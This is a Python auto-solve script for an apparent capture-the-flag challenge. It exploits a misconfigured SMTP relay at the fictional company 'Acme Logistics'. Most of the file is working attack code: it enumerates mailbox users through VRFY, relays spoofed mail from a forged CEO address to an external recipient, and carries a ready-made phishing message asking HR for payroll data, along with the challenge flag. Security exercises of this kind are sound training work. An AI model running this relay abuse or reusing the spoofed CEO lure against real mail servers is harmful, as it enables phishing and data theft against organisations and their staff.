#!/usr/bin/env python3
"""
Auto-solve script for Acme Logistics SMTP Relay Vulnerability
Demonstrates the misconfigured smtpd_recipient_restrictions vulnerability
"""

import socket
import base64
import time
import sys
import os

def connect_smtp(host, port):
    """Connect to SMTP server"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        return sock
    except Exception as e:
        print(f"❌ Failed to connect to {host}:{port} - {e}")
        return None

def send_command(sock, command, expect_code=None):
    """Send SMTP command and check response"""
    try:
        sock.send(f"{command}\r\n".encode())
        response = sock.recv(1024).decode()
        print(f"→ {command}")
        print(f"← {response.strip()}")
        
        if expect_code:
            if not response.startswith(str(expect_code)):
                print(f"❌ Expected {expect_code} but got: {response.split()[0]}")
                return False
        return True
    except Exception as e:
        print(f"❌ Error sending command: {e}")
        return False

def exploit_smtp_relay(host, port):
    """Exploit the SMTP relay vulnerability"""
    print("🔍 Starting SMTP Relay Vulnerability Exploitation")
    print("=" * 60)
    
    # Step 1: Connect to SMTP server
    sock = connect_smtp(host, port)
    if not sock:
        return False
    
    try:
        # Step 2: Send EHLO
        if not send_command(sock, "EHLO attacker.com", "250"):
            return False
        
        # Step 3: Set MAIL FROM to ceo@acmelogistics.local (Acme domain)
        # This is the key vulnerability - sender from acmelogistics.local allows relay
        if not send_command(sock, "MAIL FROM: <ceo@acmelogistics.local>", "250"):
            return False
        
        # Step 4: Set RCPT TO to external recipient (should be allowed due to vulnerability)
        if not send_command(sock, "RCPT TO: <attacker@external.com>", "250"):
            return False
        
        # Step 5: Send DATA
        if not send_command(sock, "DATA", "354"):
            return False
        
        # Step 6: Send email content
        email_content = """Subject: Urgent: Payroll Data Request
From: ceo@acmelogistics.local
To: attacker@external.com
Date: """ + time.strftime("%a, %d %b %Y %H:%M:%S +0000") + """

Dear HR Team,

This is an urgent request from the CEO office. Please forward the complete 
payroll data for Q4 2024 to this email address immediately.

This is a critical business requirement and needs to be completed by end of day.

Best regards,
CEO
Acme Logistics

FLAG{SMTP_RELAY_MISCONFIGURATION_EXPLOITED}
"""
        
        sock.send(email_content.encode())
        sock.send(b"\r\n.\r\n")
        
        response = sock.recv(1024).decode()
        print(f"← {response.strip()}")
        
        if response.startswith("250"):
            print("✅ SUCCESS: Email relayed successfully!")
            print("🎯 VULNERABILITY EXPLOITED: SMTP relay allowed for acmelogistics.local sender")
            print("📧 Email sent from ceo@acmelogistics.local to attacker@external.com")
            print("🚩 Flag: FLAG{SMTP_RELAY_MISCONFIGURATION_EXPLOITED}")
            return True
        else:
            print("❌ FAILED: Email relay was blocked")
            return False
            
    except Exception as e:
        print(f"❌ Error during exploitation: {e}")
        return False
    finally:
        sock.close()

def test_normal_relay_block(host, port):
    """Test that normal relay is blocked (for comparison)"""
    print("\n🔒 Testing Normal Relay Block (should fail)")
    print("=" * 60)
    
    sock = connect_smtp(host, port)
    if not sock:
        return False
    
    try:
        send_command(sock, "EHLO attacker.com", "250")
        send_command(sock, "MAIL FROM: <attacker@evil.com>", "250")
        
        # This should be blocked
        if send_command(sock, "RCPT TO: <victim@external.com>", "554"):
            print("❌ FAILED: Normal relay should be blocked")
            return False
        else:
            print("✅ SUCCESS: Normal relay correctly blocked")
            return True
            
    except Exception as e:
        print(f"❌ Error testing normal relay: {e}")
        return False
    finally:
        sock.close()

def test_user_enumeration(host, port):
    """Test user enumeration via VRFY command"""
    print("\n👥 Testing User Enumeration")
    print("=" * 60)
    
    sock = connect_smtp(host, port)
    if not sock:
        return False
    
    try:
        users = ['ceo', 'cfo', 'hr', 'admin', 'john.doe', 'jane.smith', 'mike.wilson']
        found_users = []
        
        for user in users:
            if send_command(sock, f"VRFY {user}", "250"):
                found_users.append(user)
        
        if found_users:
            print(f"✅ Found users: {', '.join(found_users)}")
            return True
        else:
            print("❌ No users found")
            return False
            
    except Exception as e:
        print(f"❌ Error during user enumeration: {e}")
        return False
    finally:
        sock.close()

def main():
    host = os.getenv('SMTP_HOST', 'localhost')
    port = int(os.getenv('SMTP_PORT', '25'))
    
    print("🚀 Acme Logistics SMTP Relay Vulnerability Auto-Solve")
    print("=" * 60)
    print(f"Target: {host}:{port}")
    print()
    
    # Test 1: Normal relay should be blocked
    if not test_normal_relay_block(host, port):
        print("❌ Normal relay test failed")
        return 1
    
    # Test 2: User enumeration
    if not test_user_enumeration(host, port):
        print("❌ User enumeration test failed")
        return 1
    
    # Test 3: Exploit the vulnerability
    if exploit_smtp_relay(host, port):
        print("\n🎉 VULNERABILITY SUCCESSFULLY EXPLOITED!")
        print("=" * 60)
        print("The SMTP server has a misconfigured smtpd_recipient_restrictions")
        print("that allows relay for any sender from acmelogistics.local domain.")
        print("This enables email spoofing and potential phishing attacks.")
        print()
        print("🚩 FLAG: FLAG{SMTP_RELAY_MISCONFIGURATION_EXPLOITED}")
        return 0
    else:
        print("\n❌ VULNERABILITY EXPLOITATION FAILED")
        return 1

if __name__ == "__main__":
    sys.exit(main()) 